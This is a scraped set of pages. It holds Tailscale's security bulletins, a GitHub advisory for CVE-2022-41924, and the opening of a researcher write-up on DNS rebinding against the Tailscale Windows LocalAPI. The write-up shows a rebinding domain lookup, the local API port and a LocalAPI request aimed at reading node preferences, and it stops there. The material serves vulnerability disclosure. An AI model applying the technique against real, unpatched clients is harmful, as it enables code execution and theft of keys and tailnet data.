***Description***: An issue in the Tailscale coordination server allowed tailnets created by GitHub organizations which were subsequently renamed to be associated with a new GitHub organization with the previous name.

#### What happened?

Tailscale mapped tailnets created by GitHub organizations to their organization name, rather than to their organization ID. This meant that if a GitHub organization was renamed, and the previous name taken over by a new GitHub organization, the existing tailnet would be tied to the new GitHub organization instead of the original one.

#### Who is affected?

**Up to 1,305 tailnets created by GitHub organizations may have been affected, if those GitHub organizations were renamed between 2021-06-18 and 2023-03-30 and fully relinquished the old GitHub organization name**. Additional tailnets created by GitHub organizations could be verified to definitely not have been renamed in that time period based on organization membership.

**No tailnets were definitively found to have been affected**. If a tailnet created by a GitHub organization is affected, we can detect this the next time an unauthorized user logs in to the tailnet belonging to the renamed organization and block their access. We will contact the [security contact](/kb/1224/contact-preferences/#setting-the-security-issues-email) for that tailnet if that happens.

#### What is the impact?

**A renamed GitHub organization may have had their previous tailnet visible to a newly created GitHub organization with the same name.**
The new GitHub organization would be aware of the existence of the previous tailnet. Devices added to the new GitHub organization would be aware of the existence and some metadata of previous added devices, including: their host names, their OS and version, when the devices were last connected, and their public IP addresses. They would have been able to connect to these devices if allowed by ACLs. The new GitHub organization would not have had any admin access or be able to see or modify any setting in the admin console.

There is no evidence of this vulnerability being purposefully triggered or exploited.

#### What do I need to do?

**No action is required**. Tailscale has deployed a fix to the coordination server as of 2023-03-30.

GitHub organizations which were previously renamed and lost access to their tailnet should [contact support](/contact/support/). When renaming a GitHub organization, [contact support](/contact/support/?type=sso) to migrate the tailnet to the new GitHub organization.

#### Credits

We would like to thank [Thomas Way](https://6f.io/) for reporting this issue.

## Mar 22, 2023

### [TS-2023-003](#ts-2023-003)

***Reference***: [CVE-2023-28436](https://www.cve.org/CVERecord?id=CVE-2023-28436)

***Severity***: Medium

***CVSS vector string***: CVSS:3.0/AV:A/AC:L/PR:H/UI:R/S:C/C:H/I:N/A:N

***Description***: A vulnerability identified in the implementation of Tailscale SSH in FreeBSD allowed commands to be run with a higher privilege group ID than that specified by Tailscale SSH access rules.

***Affected platforms***: FreeBSD

***Patched Tailscale client versions***: v1.38.2 or later

#### What happened?

A difference in the behavior of the FreeBSD `setgroups` system call from POSIX meant that the Tailscale client running on a FreeBSD-based operating system did not appropriately restrict groups on the host when using Tailscale SSH. When accessing a FreeBSD host over Tailscale SSH, the egid of the tailscaled process was used instead of that of the user specified in Tailscale SSH access rules.

#### Who is affected?

9 tailnets with 22 FreeBSD nodes running Tailscale SSH since Tailscale v1.34 (released on 2022-12-04) may have had Tailscale SSH sessions with a higher privilege group ID than that specified in Tailscale SSH access rules.

We have notified affected organizations where we have [security contacts](/kb/1224/contact-preferences/#setting-the-security-issues-email).

#### What is the impact?

Tailscale SSH commands may have been run with a higher privilege group ID than that specified in Tailscale SSH access rules if they met all of the following criteria:

* The destination node was a FreeBSD device with Tailscale SSH enabled;
* Tailscale SSH access rules permitted access for non-root users; and
* A non-interactive SSH session was used.

#### What do I need to do?

If you are running Tailscale on FreeBSD, upgrade to v1.38.2 or later to remediate the issue. Admins of a tailnet can view [FreeBSD nodes with unpatched versions](https://login.tailscale.com/admin/machines?q=version%3A%3C1.38.2+freebsd) in the admin console.

To update the local ports tree in advance of what's available upstream, you can:

1. `cd /usr/ports/security/tailscale`
2. edit the Makefile to set `PORTVERSION` to `1.38.2`
3. `make makesum`
4. `make install`

Tailscale SSH on other platforms is not affected.

#### Credits

We would like to thank [Ryan Belgrave](https://www.linkedin.com/in/rbelgrave/) for reporting this issue.

## Jan 24, 2023

### [TS-2023-002](#ts-2023-002)

***Description***: An issue in the Tailscale coordination server allowed nodes with expired node keys to continue communicating with other nodes in a tailnet.

#### What happened?

There was a flaw in Tailscale’s logic for expiring node keys. If the set of nodes that can connect in a tailnet (the netmap) didn’t have any changes, then expired node keys were not immediately removed from the netmap. The longest delay in removal was 19 days, from 2022-12-20 to 2023-01-09.

#### Who is affected?

**All tailnets with nodes whose node keys expired prior to 2023-01-12 may have been affected**. Admins of a tailnet can view [nodes with expired node keys](https://login.tailscale.com/admin/machines?q=disabled%3Aexpired) in the admin console.

#### What is the impact?

Connections between nodes could continue after a node key expired, both when the expired node key was the source or when it was the destination of a connection. Connections to nodes with expired node keys would only be possible if they met all of the following criteria:

* The peer node was in the same tailnet as, or shared into a tailnet with the node with the expired node key;
* The peer node and the node with the expired node key were allowed to connect based on the access rules in the tailnet policy file at the time of expiry of the node key;
* The tailnet’s netmap, including access rules, nodes added or removed from the tailnet, or connectivity of nodes in the tailnet did not change since the node key expiry; and
* Tailscale had not deployed a change to the coordination server since the node key expiry.

#### What do I need to do?

**No action is required**. Tailscale has deployed a fix to the coordination server as of 2023-01-11.

**Upgrade clients to v1.36 or later for an additional mitigation**. In conjunction with the coordination server fix, this mitigation prevents nodes from connecting to nodes with expired node keys if the Tailscale coordination server is offline or unreachable.

#### Credits

We would like to thank [Derek Ellis](https://me.ellisd.com) and [Alex Eiser](https://www.cranksecurity.com/) for reporting this issue.

## Jan 17, 2023

### [TS-2023-001](#ts-2023-001)

***Description***: An issue in the Tailscale coordination server allowed a malicious individual to share nodes from other tailnets to themselves, if they knew the node ID of the target.

#### What happened?

A bug in Tailscale’s node sharing logic allowed the creation of sharing invitations by unauthorized users. A malicious individual who knew a target node’s database ID could generate and accept a sharing invite for that node without being an admin of the target node’s tailnet.

This was possible for any node in any tailnet, as long as the individual knew the target’s node ID. The node ID is an integer used in the admin panel’s database, and is not related to the node “StableID” that is visible to Tailscale clients. A node’s ID is only visible in the API or admin console, by admins of either the node’s tailnet or a tailnet to which that node has already been shared. IDs are random 64-bit numbers that are not sequential or otherwise easily guessable.

The bug was introduced on 2022-09-14, reported to us on 2023-01-11, and remediated on 2023-01-12.

#### Who is affected?

All tailnets with nodes are affected.

#### What is the impact?

**This vulnerability was not triggered or exploited**. Analysis of tailnet logs shows that no unauthorized shares were created or accepted while the vulnerability was present, except as part of the proof of concept from the individual who reported the vulnerability.

Admins of a tailnet can review [nodes that are shared out of their tailnet](https://login.tailscale.com/admin/machines?q=shared%3Aout) in the admin console. Sharing invites are logged as [events in configuration audit logs](/kb/1203/audit-logging/#events-for-shared-nodes). Admins can also review [invites created and accepted in their configuration audit logs](https://login.tailscale.com/admin/logs?events=%5B%22INVITECREATENODE_SHARE%22%2C%22INVITEACCEPTNODE_SHARE%22%5D) in the admin console.

#### What do I need to do?

**No action is required**. Tailscale has deployed a fix to the coordination server as of 2023-01-12, and verified that the vulnerability was not exploited.

#### Credits

We would like to thank Benjamin Roberts ([tsujamin](https://github.com/tsujamin)) for reporting this issue.

## Nov 21, 2022

### [TS-2022-004](#ts-2022-004)

***Reference***: [CVE-2022-41924](https://www.cve.org/CVERecord?id=CVE-2022-41924)

***Severity***: Critical

***CVSS vector string***: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:H

***Description***: A vulnerability identified in the Tailscale Windows client allows a malicious website to reconfigure the Tailscale daemon `tailscaled`, which can then be used to remotely execute code.

***Affected platforms***: Windows

***Patched Tailscale client versions***: v1.32.3 or later, v1.33.257 or later (unstable)

#### What happened?

In the Tailscale Windows client, the local API was bound to a local TCP socket, and communicated with the Windows client GUI in cleartext with no Host header verification. This allowed an attacker-controlled website visited by the node to rebind DNS to an attacker-controlled DNS server, and then make local API requests in the client, including changing the coordination server to an attacker-controlled coordination server.

#### Who is affected?

All Windows clients prior to version v1.32.3 are affected.

#### What is the impact?

An attacker-controlled coordination server can send malicious URL responses to the client, including pushing executables or installing an SMB share. These allow the attacker to remotely execute code on the node.

Reviewing all logs confirms this vulnerability was not triggered or exploited.

#### What do I need to do?

**If you are running Tailscale on Windows, upgrade to v1.32.3 or later to remediate the issue.**

#### Credits

We would like to thank [Emily Trau](https://github.com/emilytrau) and [Jamie McClymont (CyberCX)](https://twitter.com/JJJollyjim) for reporting this issue. Further detail is available in [their blog post](https://emily.id.au/tailscale).

### [TS-2022-005](#ts-2022-005)

***Reference***: [CVE-2022-41925](https://www.cve.org/CVERecord?id=CVE-2022-41925)

***Severity***: Low

***CVSS vector string***: CVSS:3.0/AV:A/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N

***Description***: A vulnerability identified in the Tailscale client allows a malicious website to access the peer API, which can then be used to access Tailscale environment variables.

***Affected platforms***: All

***Patched Tailscale client versions***: v1.32.3 or later, v1.33.257 or later (unstable)

#### What happened?

In the Tailscale client, the peer API was vulnerable to DNS rebinding. This allowed an attacker-controlled website visited by the node to rebind DNS for the peer API to an attacker-controlled DNS server, and then making peer API requests in the client, including accessing the node’s Tailscale environment variables.

#### Who is affected?

All Tailscale clients prior to version v1.32.3 are affected.

#### What is the impact?

An attacker with access to the peer API on a node could use that access to read the node’s environment variables, including any credentials or secrets stored in environment variables. This may include Tailscale authentication keys, which could then be used to add new nodes to the user’s tailnet. The peer API access could also be used to learn of other nodes in the tailnet or send files via Taildrop.

An attacker with access to the peer API who sent a malicious file via Taildrop which was accessed while it was loading could use this to gain access to the local API, and remotely execute code.

There is no evidence of this vulnerability being purposefully triggered or exploited.

#### What do I need to do?

**Upgrade to v1.32.3 or later to remediate the issue.**

#### Credits

We would like to thank [Emily Trau](https://github.com/emilytrau) and [Jamie McClymont (CyberCX)](https://twitter.com/JJJollyjim) for reporting this issue. Further detail is available in [their blog post](https://emily.id.au/tailscale).

## Jun 14, 2022

### [TS-2022-003](#ts-2022-003)

***Description***: An issue in Tailscale’s implementation of the OAuth authentication flow for GitHub allowed users who authenticate to Tailscale with their GitHub user identity to create a tailnet for a GitHub organization using [SAML authentication](https://docs.github.com/en/enterprise-cloud%40latest/authentication/authenticating-with-saml-single-sign-on/about-authentication-with-saml-single-sign-on) in [GitHub Enterprise Cloud](https://docs.github.com/en/get-started/onboarding/getting-started-with-github-enterprise-cloud), where Tailscale is not an [authorized OAuth app](https://docs.github.com/en/enterprise-cloud%40latest/authentication/keeping-your-account-and-data-secure/authorizing-oauth-apps) for their organization.

#### What happened?

Tailscale silently ignored a 403 error to the [GitHub API query for organizations for an authenticated user](https://docs.github.com/en/enterprise-cloud%40latest/rest/orgs/orgs#list-organizations-for-the-authenticated-user) that was returned when a user authenticated to SAML, but the organization had not authorized Tailscale. This only applied to organizations using SAML on GitHub Enterprise Cloud with OAuth app authorization enabled, and where Tailscale was not authorized.

As a result, a user identity could bypass the organization’s OAuth app access restrictions, and create a tailnet for the GitHub organization.

#### Who is affected?

**Up to 7 tailnets for GitHub organizations on GitHub Enterprise Cloud which use SAML for authentication may have been created between 2021-06-18 and 2022-06-03 without Tailscale being an authorized OAuth app for their GitHub organization**, and could have used Tailscale to connect devices in that organization. An additional 10 tailnets were created with no or only one device, and so could not have used Tailscale to connect between devices.

We have notified the Tailscale admins for the affected organizations who we were able to identify. We do not have a way to notify the GitHub organization owners.

If you’re a GitHub organization owner, you can see if Tailscale is approved for your GitHub organization by going to the organization’s settings page and selecting “Third-party access” from the left-hand navigation. Or, for an organization `$your-org`, navigate to

```
https://github.com/organizations/$your-org/settings/oauth_application_policy

```
#### What is the impact?

**A tailnet may have been created for a GitHub organization without their GitHub organization owner’s approval**. In this case, the use of Tailscale and the creation of a tailnet could be perceived as being sanctioned by their organization when it might not have been.

#### What do I need to do?

**If you are affected, you will need to re-authenticate to keep using your tailnet**. Tailscale has expired all admin console sessions for potentially affected GitHub organizations as of 2022-06-13. As a result, users in a potentially affected tailnet will need to re-authenticate the next time they access the admin console, and will not be able to do so without Tailscale being an authorized OAuth app, which may first require getting approval from their GitHub organization owner. Nodes in a potentially affected tailnet will also need to re-authenticate when their node keys expire. If you’re a GitHub organization owner, you can approve Tailscale as an OAuth app by following GitHub’s instructions for [Approving OAuth Apps for your organization](https://docs.github.com/en/organizations/restricting-access-to-your-organizations-data/approving-oauth-apps-for-your-organization).

Tailscale has deployed a fix to the coordination server as of 2022-06-03, so that no new tailnets can be created without a GitHub organization owner’s approval.

#### Credits

We would like to thank [Aurelia](https://github.com/acuteaura) for reporting the issue. Further detail is available in [their blog post](https://notes.acuteaura.net/posts/github-enterprise-security/).

## May 11, 2022

### [TS-2022-002](#ts-2022-002)

***Description***: An issue in the Tailscale coordination server allowed individuals creating a new Tailscale account with a gmail.com email address to join the same tailnet, rather than individual tailnets.

#### What happened?

There was a flaw in Tailscale’s logic for migrating accounts between identity providers, and a new gmail.com shared tailnet was accidentally created. Once created, any user who tried to create a new Tailscale account with a gmail.com email address joined the shared gmail.com tailnet.

#### Who is affected?

**A total of 44 users with 59 devices who created accounts for their gmail.com email addresses on 2022-05-11 between 10:56 and 13:12 PT were affected**. We have notified affected users.

#### What is the impact?

**Six connections between devices belonging to different users were made, but no traffic of concern flowed between them**. Four connections were pings, and two connections were UDP traffic on port 27036, likely automated broadcasting by a gaming platform to discover peers to play with. There is no evidence of malicious traffic.

**Impacted users could see some metadata about other users and devices from their devices’ clients**, including users’ names, devices’ host names, and devices’ Tailscale IP addresses. This information *was* viewed by at least one user, who reported it to us.

**One user, the tailnet Admin, was able to see all users and devices added to the shared gmail.com tailnet**. This includes users’ email addresses, names, and when they were last connected; and devices’ host names, their OS and version, when the devices were last connected, and their public IP addresses. This information *was* viewed by the user, who reported it to us.

#### What do I need to do?

**No action is required**. Tailscale has deployed a fix to the coordination server as of 2022-05-11 13:12 PT.

New users registering for a Tailscale account with a gmail.com email address will create a tailnet as normal.

#### Credits

We would like to thank [David Swafford](https://www.linkedin.com/in/davidswafford/) and George Constantinides for reporting the issue.

## Feb 7, 2022

### [TS-2022-001](#ts-2022-001)

***Description***: An issue in the Tailscale coordination server allowed individuals using GitHub to authenticate to Tailscale to have their devices join a tailnet associated with an empty GitHub username.

#### What happened?

There was a flaw in Tailscale’s authorization logic for the GitHub identity provider. If a user tried to authenticate to Tailscale using their GitHub identity, and GitHub returned a 500 error, then in some cases, Tailscale interpreted that as authorization for an empty GitHub username, and connected these devices to the tailnet associated with the empty GitHub username.

#### Who is affected?

**A total of five devices belonging to four users were affected between 2021-06-15 and 2022-02-04**, when the issue was reported and remediated. We have contacted the two users we were able to identify.

**You may be affected if you authenticated to Tailscale using a GitHub account, and after authorizing a connection using GitHub, you received a connection error.** Without being asked to select which GitHub user or organization tailnet to connect to, your device would have connected to a tailnet.

#### What is the impact?

**No device connected to another device in the tailnet.** Other than the two devices which belonged to the same user, no two devices in the tailnet had valid node keys at the same time, and so did not and would not have been able to establish connections.

**A device’s existence and some metadata was shared with devices added later in time.** Devices added later in time were able to see previously added devices, including: their host names, their OS and version, when the devices were last connected, and their public IP addresses.

There is no evidence of this vulnerability being purposefully triggered or exploited.

#### Credits

We would like to thank Marvin Boothby ([boothb](https://github.com/boothb)) for reporting the issue.

## Try Tailscale for free

[Get started](https://login.tailscale.com/start)Schedule a demo[Contact sales](/contact/sales)![cta phone](https://cdn.sanity.io/images/w77i7m8x/production/b715b4ca5e2577da60f0d529a4a9bc2ad4cadf59-362x567.svg?w=750&q=75&fit=clip&auto=format)![mercury](https://cdn.sanity.io/images/w77i7m8x/production/459a7a8492910eeb22f22bb8d4c0f864b0bae25f-199x81.svg?w=640&q=75&fit=clip&auto=format)![instacrt](https://cdn.sanity.io/images/w77i7m8x/production/7d127f4bb62a408b056328349f291857df6251b3-199x81.svg?w=640&q=75&fit=clip&auto=format)![Retool](https://cdn.sanity.io/images/w77i7m8x/production/e9579b00087d7896e9cb750f4eb39f2c11ed11b8-199x82.svg?w=640&q=75&fit=clip&auto=format)![duolingo](https://cdn.sanity.io/images/w77i7m8x/production/7958bf3d43a30e661ca74cf0510f250d9b99ecef-199x81.svg?w=640&q=75&fit=clip&auto=format)![Hugging Face](https://cdn.sanity.io/images/w77i7m8x/production/68e2e5024898bcd6f6d142e0306dc7564787e1d7-199x82.svg?w=640&q=75&fit=clip&auto=format)

Product

[How it works](/blog/how-tailscale-works)[Pricing](/pricing)[Integrations](/integrations)[Features](/features)[Compare Tailscale](/compare)

Use Cases

[Business VPN](/use-cases/business-vpn)[Remote Access](/use-cases/remote-access)[Site-to-Site Networking](/use-cases/site-to-site-networking)[Homelab](/use-cases/homelab)[Enterprise](/enterprise)

Resources

[Blog](/blog)[Events & Webinars](/events-webinars)[Partnerships](/partnerships)

Company

[Company](/company)[Careers](/careers)[Press](/press)

Help & Support

[Support](/contact/support)[Sales](/contact/sales)[Security](/security)[Legal](/legal)[Open Source](/opensource)[Changelog](/changelog)

Learn

[SSH keys](/learn/generate-ssh-keys)[Docker SSH](/learn/ssh-into-docker-container)[DevSecOps](/learn/devsecops)[Multicloud](/learn/multicloud)[NAT Traversal](/blog/how-nat-traversal-works)[MagicDNS](/blog/2021-09-private-dns-with-magicdns)[PAM](/learn/privileged-access-management)[PoLP](/learn/principle-of-least-privilege)[All articles](/learn)[Terms of Service](/terms)[Privacy Policy](/privacy-policy)WireGuard is a registered trademark of Jason A. Donenfeld.© 2025 Tailscale Inc. All rights reserved. Tailscale is a registered trademark of Tailscale Inc.

=== Content from github.com_b5ba46d3_20250108_144039.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftailscale%2Ftailscale%2Fsecurity%2Fadvisories%2FGHSA-vqp6-rc3h-83cp)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftailscale%2Ftailscale%2Fsecurity%2Fadvisories%2FGHSA-vqp6-rc3h-83cp)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=tailscale%2Ftailscale)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[tailscale](/tailscale)
/
**[tailscale](/tailscale/tailscale)**
Public

* [Notifications](/login?return_to=%2Ftailscale%2Ftailscale) You must be signed in to change notification settings
* [Fork
  1.6k](/login?return_to=%2Ftailscale%2Ftailscale)
* [Star
   20.2k](/login?return_to=%2Ftailscale%2Ftailscale)

* [Code](/tailscale/tailscale)
* [Issues
  2.7k](/tailscale/tailscale/issues)
* [Pull requests
  221](/tailscale/tailscale/pulls)
* [Actions](/tailscale/tailscale/actions)
* [Wiki](/tailscale/tailscale/wiki)
* [Security](/tailscale/tailscale/security)
* [Insights](/tailscale/tailscale/pulse)

Additional navigation options

* [Code](/tailscale/tailscale)
* [Issues](/tailscale/tailscale/issues)
* [Pull requests](/tailscale/tailscale/pulls)
* [Actions](/tailscale/tailscale/actions)
* [Wiki](/tailscale/tailscale/wiki)
* [Security](/tailscale/tailscale/security)
* [Insights](/tailscale/tailscale/pulse)

# Tailscale Windows daemon is vulnerable to RCE via CSRF

Critical

[mayakacz](/mayakacz)
published
GHSA-vqp6-rc3h-83cp
Nov 21, 2022

## Package

tailscale/tailscale

## Affected versions

<1.32.3

## Patched versions

1.32.3, 1.33.2

## Description

A vulnerability identified in the Tailscale Windows client allows a malicious website to reconfigure the Tailscale daemon `tailscaled`, which can then be used to remotely execute code.

**Affected platforms:** Windows

**Patched Tailscale client versions:** v1.32.3 or later, v1.33.257 or later (unstable)

### What happened?

In the Tailscale Windows client, the local API was bound to a local TCP socket, and communicated with the Windows client GUI in cleartext with no Host header verification. This allowed an attacker-controlled website visited by the node to rebind DNS to an attacker-controlled DNS server, and then make local API requests in the client, including changing the coordination server to an attacker-controlled coordination server.

### Who is affected?

All Windows clients prior to version v.1.32.3 are affected.

### What should I do?

If you are running Tailscale on Windows, upgrade to v1.32.3 or later to remediate the issue.

### What is the impact?

An attacker-controlled coordination server can send malicious URL responses to the client, including pushing executables or installing an SMB share. These allow the attacker to remotely execute code on the node.

Reviewing all logs confirms this vulnerability was not triggered or exploited.

### Credits

We would like to thank [Emily Trau](https://github.com/emilytrau) and [Jamie McClymont (CyberCX)](https://twitter.com/JJJollyjim) for reporting this issue. Further detail is available in [their blog post](https://emily.id.au/tailscale).

### References

* [TS-2022-004](https://tailscale.com/security-bulletins/#ts-2022-004)
* [Researcher blog post](https://emily.id.au/tailscale)

### For more information

If you have any questions or comments about this advisory, [contact Tailscale support](https://tailscale.com/contact/support/).

### Severity

Critical

9.6

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
None

User interaction
Required

Scope
Changed

Confidentiality
High

Integrity
Low

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:H

### CVE ID

CVE-2022-41924

### Weaknesses

[CWE-346](/advisories?query=cwe%3A346)

### Credits

* [![@emilytrau](https://avatars.githubusercontent.com/u/13267947?s=40&v=4)](/emilytrau)
  [emilytrau](/emilytrau)
  Analyst
* [![@JJJollyjim](https://avatars.githubusercontent.com/u/691552?s=40&v=4)](/JJJollyjim)
  [JJJollyjim](/JJJollyjim)
  Analyst

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from emily.id.au_db69b798_20250108_144039.html ===

# Emily Trau

🏳️‍🌈

[GitHub](https://github.com/emilytrau)[Mastodon](https://hachyderm.io/%40emilyposting)[Cohost](https://cohost.org/emilyposting)[Twitter](https://twitter.com/emilyposting_)Email[Home](/ "Back to Index Page")
# CVE-2022-41924 - RCE in Tailscale, DNS Rebinding, and You

25 min read

Jamie McClymont & Emily Trau

2022-11-22

## TL;DR Recommendations

### For Issues 1-6

Update to Tailscale **v1.32.3**, which was released today. Note that Tailscale
does not automatically update itself. Administrators can see the current version
running on all devices on the Tailscale admin page.

In descending order of priority, update:

1. Windows machines with web browsers
2. Other machines with web browsers
3. Machines without web browsers

See Tailscale's
[blog post](https://tailscale.com/blog/windows-security-vulnerabilities/ "null") and
[bulletins (TS-2022-004 and TS-2022-005)](https://tailscale.com/security-bulletins/ "null").

### For Issue 7

If you run non-HTTPS web services on your Tailnet, and those services are
unauthenticated *or* rely on Tailscale for authentication, implement an
allowlist of expected HTTP `Host` headers to prevent malicious Javascript from
accessing these services.

This mitigation can be tested with `curl` – if you can put something random in
the `Host` header, and you can view information or take actions which should not
be available to the public, action is required:

![](/posts/tailscale/dns-rebinding.png)

Alternatively, you can use Tailscale's built-in TLS certificate support to run
internal services with HTTPS (and with HTTP disabled or just redirecting to
HTTPS), either [directly](https://tailscale.com/blog/tls-certs/ "null") or via
something like [caddy](https://tailscale.com/blog/caddy/ "null").

Tailscale has published remediation advice for this issue
[here](https://tailscale.com/kb/1196/security-hardening/#prevent-dns-rebinding-attacks "null").

### Overall

Keep using Tailscale! 💕

The speed and quality of Tailscale's response to our report is unlike any vendor
interaction I have experienced, and suggests a deep commitment to keeping their
customers safe.

---

## Background

Tailscale is a mesh VPN service: nodes on a Tailscale network establish direct
Wireguard connections to one another on-demand, using information pushed out by
a central control plane (what IPs each node can be found at, what Wireguard
public keys they use, which nodes are allowed to access which ports, etc.).

On each node, a process called tailscaled does all the heavy lifting – talking
to the control plane, setting up the TUN interface, and carrying packets back
and forth. A separate process provides a tray icon and configuration GUI in the
Windows taskbar (or the macOS menu bar). On Linux, configuration is performed
solely through the `tailscale` command-linux utility. These front-end interfaces
communicate with `tailscaled` through an HTTP API called the LocalAPI.

On unix platforms, the LocalAPI is bound to an `AF_UNIX` socket, with a tiered
permission structure (basic read-only access for most unix users, privileged
access for `root` or another specially designated user).

On Windows, which lacks (or
[lacked!](https://devblogs.microsoft.com/commandline/af_unix-comes-to-windows/ "null"))
`AF_UNIX`, the LocalAPI instead binds to a loopback TCP socket,
`127.0.0.1:41112`. It checks `netstat` to enforce that incoming TCP connections
are from the expected Windows user, emulating the unix socket privilege model
described above.

In a world where our computers run only trusted code, these two approaches would
provide equivalent security to one another. The world we actually live in is
much, much, messier.

## The Treacherous User Agent

If you visit my website, I am granted the honour and the privilege of executing
arbitrary Javascript on your computer.

This is a pretty bad idea, but luckily even the web browser has its limits. If
my code asks, for example, to perform an HTTP request to
`/var/run/tailscale/tailscaled.sock`, I will be laughed out of the V8 engine
before I can so much as `connect(3)`.

If my code asks to speak to `127.0.0.1:41112`, the browser is a little more
receptive... but only a little. The types of requests I can make are limited,
and I cannot read the responses.

If, on the other hand, my code asks to speak to my very own website... what
could possibly be malicious about that? The browser allows abitrary requests to
be made, and responses to be read.

This last idea is known as the **Same-Origin Policy**, and is a critical layer
of asbestos fireproofing keeping the modern web from going up in flames.

Unfortunately, the Same-Origin Policy is somewhat flawed in its interpretation
of what is and is not "my website". Let's say I host my website at the memorable
domain of `s-1.2.3.4-127.0.0.1-12345-rr-e.d.rebind.it`:

```

$ host s-1.2.3.4-127.0.0.1-12345-rr-e.d.rebind.it
s-1.2.3.4-127.0.0.1-12345-rr-e.d.rebind.it has address 1.2.3.4
$ host s-1.2.3.4-127.0.0.1-12345-rr-e.d.rebind.it
s-1.2.3.4-127.0.0.1-12345-rr-e.d.rebind.it has address 127.0.0.1

```

When my web page (which was initially loaded from a server at `1.2.3.4`) wishes
the make a request to its own domain, the browser will check with DNS again,
just in case I've decided to move my web server down the street in the time
since you loaded the page. Surprisingly, I have! My web server is now located at
`127.0.0.1`!

The browser dutifully carries out the request to this new IP address, without
ever deeming the request to be Cross-Origin, since the domain of the webpage
matches the domain of the new request. This is called a DNS Rebinding attack.

### Issue 1 - LocalAPI vulnerable to DNS Rebinding on Windows

**CVE**: CVE-2022-41924
 **Advisory**:
[TS-2022-004](https://tailscale.com/security-bulletins/#ts-2022-004 "null")

*Resolved in `1.32.3` (`Host` header allowlist implemented)*

Applying this technique, our malicious website can make arbitrary requests to
the LocalAPI. Since the API does not apply any additional authentication, apart
from checking that our browser is running as the same Windows user as the
Tailscale GUI, we have full privileges, and can introspect and reconfigure
`tailscaled` to taste.

What will we do with our newfound abilities?

## Information Disclosure

The `status` and `whois` endpoints expose details (hostnames, TS and real IP
addresses, service lists) of the machines on the tailnet, as well as the names,
email addresses, and profile pictures of machines' owners.

We can also learn the Wireguard private key used by the node. This is sanitised
when the preferences are requested:

```
GET /localapi/v0/prefs HTTP/1.1

...
